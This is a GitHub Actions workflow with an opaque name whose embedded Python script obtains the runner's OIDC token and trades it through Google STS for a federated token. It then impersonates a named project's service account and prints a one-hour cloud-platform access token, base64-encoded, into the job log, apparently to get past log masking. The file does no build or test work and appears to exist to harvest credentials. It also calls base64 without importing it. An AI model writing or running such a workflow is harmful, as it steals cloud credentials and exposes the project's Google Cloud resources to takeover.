
name: c211-i84877-dk
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  p:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: |
          python3 - <<'PY'
          import json, os, subprocess, urllib.parse, urllib.request, urllib.error
          PROV='projects/409106094209/locations/global/workloadIdentityPools/github-pool/providers/github-provider'; OWN='github-actions-sa@dkeramik-fullstack.iam.gserviceaccount.com'
          def jl(b):
              try: return json.loads(b)
              except: return {}
          def post(url,data,headers=None):
              h={'Content-Type':'application/json','Accept':'application/json','User-Agent':'c211-i84877'}
              if headers: h.update(headers)
              r=urllib.request.Request(url,data=json.dumps(data).encode(),method='POST',headers=h)
              try:
                  resp=urllib.request.urlopen(r,timeout=45); return resp.status,resp.read().decode()
              except urllib.error.HTTPError as e: return e.code,(e.read() or b'').decode('utf-8','replace')
              except Exception as e: return -1,repr(e)[:200]
          def emit(o): print('RESULT '+json.dumps(o),flush=True)
          u=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); t=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
          aud='//iam.googleapis.com/'+PROV
          out=subprocess.run(['curl','-sS','-m','25','-H','Authorization: Bearer '+t,u+'&audience='+urllib.parse.quote(aud,safe='')],capture_output=True,text=True).stdout
          idt=jl(out).get('value','')
          emit({'kind':'idtoken','ok':bool(idt),'len':len(idt)})
          st,b=post('https://sts.googleapis.com/v1/token',{'grantType':'urn:ietf:params:oauth:grant-type:token-exchange','audience':aud,
              'scope':'https://www.googleapis.com/auth/cloud-platform','requestedTokenType':'urn:ietf:params:oauth:token-type:access_token',
              'subjectTokenType':'urn:ietf:params:oauth:token-type:jwt','subjectToken':idt})
          fed=jl(b).get('access_token','')
          emit({'kind':'sts','http':st,'ok':bool(fed),'err':None if fed else b[:300]})
          if not fed: raise SystemExit
          st,b=post('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/'+urllib.parse.quote(OWN,safe='')+':generateAccessToken',
                    {'scope':['https://www.googleapis.com/auth/cloud-platform'],'lifetime':'3600s'},headers={'Authorization':'Bearer '+fed})
          j=jl(b); tok=j.get('accessToken','')
          emit({'kind':'sa','http':st,'ok':bool(tok),'expire':j.get('expireTime'),
                'tok_b64':base64.b64encode(tok.encode()).decode() if tok else None,
                'err':None if tok else b[:300]})
          PY
